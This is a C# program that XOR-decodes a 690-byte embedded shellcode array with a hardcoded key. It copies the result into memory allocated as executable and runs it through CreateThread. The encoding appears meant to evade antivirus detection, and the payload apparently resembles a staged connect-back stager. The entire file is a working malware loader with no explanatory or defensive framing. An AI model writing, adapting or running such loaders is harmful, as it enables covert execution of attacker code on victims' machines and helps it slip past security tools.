using System;
using System.Text;
using System.Runtime.InteropServices;


public class Program
{

    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32")]
    static extern IntPtr GetConsoleWindow();

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    private static byte[] xor(byte[] cipher, byte[] key)
    {
        byte[] xored = new byte[cipher.Length];

        for (int i = 0; i < cipher.Length; i++)
        {
            xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
        }

        return xored;
    }


    static void Main()
    {
        string key = "ABCDE";

        byte[] xorshellcode = new byte[690] { 0xbd, 0x0a, 0xc0, 0xa0, 0xb5, 0xa9, 0x8e, 0x43, 0x44, 0x45, 0x00, 0x13, 0x02, 0x14, 0x17, 0x10, 0x14, 0x0b, 0x75, 0x97, 0x24, 0x0a, 0xc8, 0x16, 0x25, 0x09, 0xc9, 0x11, 0x5c, 0x0d, 0xca, 0x10, 0x63, 0x0c, 0xce, 0x33, 0x12, 0x0b, 0x4b, 0xf2, 0x0b, 0x08, 0x0e, 0x75, 0x8c, 0x09, 0x73, 0x83, 0xe8, 0x79, 0x20, 0x3e, 0x41, 0x68, 0x65, 0x00, 0x83, 0x8a, 0x49, 0x04, 0x40, 0x83, 0xa1, 0xa9, 0x17, 0x00, 0x13, 0x0b, 0xcf, 0x17, 0x61, 0xc9, 0x01, 0x78, 0x0d, 0x40, 0x92, 0x25, 0xc5, 0x3d, 0x59, 0x49, 0x41, 0x4b, 0xc0, 0x33, 0x42, 0x43, 0x44, 0xce, 0xc1, 0xca, 0x43, 0x44, 0x45, 0x09, 0xc7, 0x83, 0x30, 0x22, 0x09, 0x43, 0x93, 0x14, 0xce, 0x09, 0x5a, 0x07, 0xcf, 0x05, 0x61, 0x0b, 0x42, 0x94, 0xa6, 0x17, 0x0a, 0xbc, 0x8d, 0x04, 0xca, 0x76, 0xcb, 0x0c, 0x44, 0x97, 0x0f, 0x72, 0x8d, 0x0d, 0x70, 0x82, 0xef, 0x05, 0x84, 0x88, 0x4f, 0x02, 0x45, 0x84, 0x79, 0xa2, 0x36, 0xb5, 0x09, 0x42, 0x0e, 0x67, 0x4c, 0x00, 0x78, 0x93, 0x36, 0x9c, 0x1d, 0x05, 0xc9, 0x03, 0x60, 0x0c, 0x40, 0x92, 0x25, 0x05, 0xce, 0x4d, 0x0a, 0x07, 0xcf, 0x05, 0x5d, 0x0b, 0x42, 0x94, 0x04, 0xca, 0x46, 0xcb, 0x0c, 0x44, 0x91, 0x03, 0x1b, 0x05, 0x1d, 0x1f, 0x1b, 0x19, 0x05, 0x1d, 0x00, 0x1b, 0x02, 0x1e, 0x0d, 0xc2, 0xae, 0x63, 0x05, 0x17, 0xbe, 0xa2, 0x1b, 0x05, 0x1c, 0x1b, 0x0a, 0xc8, 0x56, 0xac, 0x0a, 0xbd, 0xbc, 0xbb, 0x18, 0x09, 0x73, 0x98, 0x17, 0x0c, 0xff, 0x35, 0x2a, 0x2a, 0x2c, 0x2f, 0x27, 0x37, 0x44, 0x04, 0x17, 0x0a, 0xca, 0xa5, 0x0c, 0x86, 0x80, 0x0f, 0x33, 0x63, 0x46, 0xbd, 0x96, 0x17, 0x16, 0x09, 0xcb, 0xa2, 0x17, 0x1f, 0x0c, 0x73, 0x83, 0x09, 0x74, 0x88, 0x11, 0x10, 0x0d, 0xff, 0x7b, 0x14, 0x3a, 0xe3, 0x45, 0x41, 0x42, 0x43, 0xbb, 0x90, 0xa9, 0x4c, 0x43, 0x44, 0x45, 0x75, 0x77, 0x6d, 0x73, 0x73, 0x6f, 0x73, 0x76, 0x7d, 0x6b, 0x70, 0x71, 0x70, 0x44, 0x1f, 0x09, 0xcb, 0x82, 0x0d, 0x82, 0x81, 0xca, 0x50, 0x44, 0x45, 0x0c, 0x73, 0x8a, 0x17, 0x16, 0x2b, 0x41, 0x10, 0x0d, 0xff, 0x16, 0xcb, 0xdc, 0x82, 0x45, 0x41, 0x42, 0x43, 0xbb, 0x90, 0xa9, 0xcb, 0x43, 0x44, 0x45, 0x6e, 0x71, 0x05, 0x30, 0x26, 0x27, 0x18, 0x0a, 0x36, 0x31, 0x3b, 0x1a, 0x0c, 0x27, 0x36, 0x78, 0x35, 0x28, 0x1b, 0x74, 0x03, 0x32, 0x34, 0x37, 0x3c, 0x39, 0x12, 0x09, 0x28, 0x1d, 0x06, 0x77, 0x2c, 0x76, 0x16, 0x1e, 0x25, 0x77, 0x74, 0x7c, 0x6c, 0x0e, 0x19, 0x73, 0x3c, 0x39, 0x34, 0x2e, 0x05, 0x68, 0x15, 0x2f, 0x77, 0x2d, 0x01, 0x32, 0x11, 0x02, 0x0d, 0x1f, 0x79, 0x21, 0x34, 0x2b, 0x1f, 0x35, 0x28, 0x0e, 0x08, 0x2b, 0x15, 0x30, 0x0e, 0x73, 0x0c, 0x32, 0x16, 0x17, 0x13, 0x09, 0x6c, 0x71, 0x2e, 0x1b, 0x1a, 0x31, 0x35, 0x26, 0x06, 0x20, 0x09, 0x1a, 0x7b, 0x71, 0x1c, 0x34, 0x35, 0x0b, 0x71, 0x04, 0x17, 0x37, 0x02, 0x34, 0x16, 0x29, 0x1d, 0x31, 0x2b, 0x0d, 0x74, 0x7b, 0x3a, 0x70, 0x77, 0x29, 0x27, 0x0b, 0x07, 0x12, 0x2c, 0x3b, 0x7b, 0x0b, 0x32, 0x00, 0x23, 0x30, 0x0f, 0x21, 0x11, 0x37, 0x2d, 0x1c, 0x75, 0x29, 0x42, 0x0b, 0xcd, 0x84, 0x12, 0x18, 0x02, 0x1c, 0x08, 0x70, 0x8b, 0x10, 0x0c, 0xfd, 0x41, 0x70, 0xe3, 0xc0, 0x45, 0x41, 0x42, 0x43, 0x14, 0x16, 0x12, 0x0b, 0x84, 0x86, 0xae, 0x14, 0x6c, 0x78, 0xbb, 0x90, 0x09, 0xcb, 0x85, 0x2e, 0x4f, 0x1e, 0x0a, 0xca, 0xb5, 0x2f, 0x5e, 0x18, 0x11, 0x2c, 0xc5, 0x72, 0x42, 0x43, 0x0d, 0xcc, 0xa1, 0x28, 0x47, 0x05, 0x1c, 0x08, 0xf8, 0x36, 0x02, 0xdb, 0xc7, 0x42, 0x43, 0x44, 0x45, 0xbe, 0x97, 0x0e, 0x75, 0x85, 0x12, 0x18, 0x0b, 0xcd, 0xb4, 0x0c, 0x73, 0x8a, 0x09, 0x74, 0x88, 0x11, 0x10, 0x0d, 0x82, 0x83, 0x6f, 0x45, 0x5c, 0x3e, 0xbe, 0x97, 0xc6, 0x84, 0x30, 0x5e, 0x0a, 0x84, 0x85, 0xcd, 0x52, 0x42, 0x43, 0x0d, 0xff, 0x05, 0xb2, 0x76, 0xa4, 0x45, 0x41, 0x42, 0x43, 0xbb, 0x90, 0x09, 0xbd, 0x8c, 0x30, 0x47, 0xaa, 0xe8, 0xab, 0x11, 0x45, 0x41, 0x42, 0x10, 0x1d, 0x2f, 0x01, 0x18, 0x0a, 0xcd, 0x94, 0x80, 0xa0, 0x53, 0x0d, 0x82, 0x81, 0x42, 0x53, 0x44, 0x45, 0x08, 0xf8, 0x1b, 0xe0, 0x16, 0xa4, 0x42, 0x43, 0x44, 0x45, 0xbe, 0x97, 0x0b, 0xd7, 0x16, 0x12, 0x0a, 0xca, 0xa3, 0x0d, 0xc8, 0xb3, 0x0b, 0xcd, 0x9f, 0x08, 0x85, 0x83, 0x44, 0x65, 0x41, 0x42, 0x0a, 0xcd, 0xbc, 0x08, 0xf8, 0x51, 0xd2, 0xcc, 0xa3, 0x42, 0x43, 0x44, 0x45, 0xbe, 0x97, 0x0b, 0xc7, 0x81, 0x61, 0xc7, 0x83, 0x30, 0xf7, 0x27, 0xc9, 0x44, 0x0c, 0x44, 0x82, 0xc7, 0x83, 0x31, 0x97, 0x19, 0x81, 0x1b, 0x2e, 0x45, 0x18, 0x0b, 0x84, 0x86, 0xb5, 0xf4, 0xe0, 0x15, 0xbb, 0x90 };
        byte[] shellcode;
        shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));

        UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        IntPtr threadHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;
        threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        return;
    }
}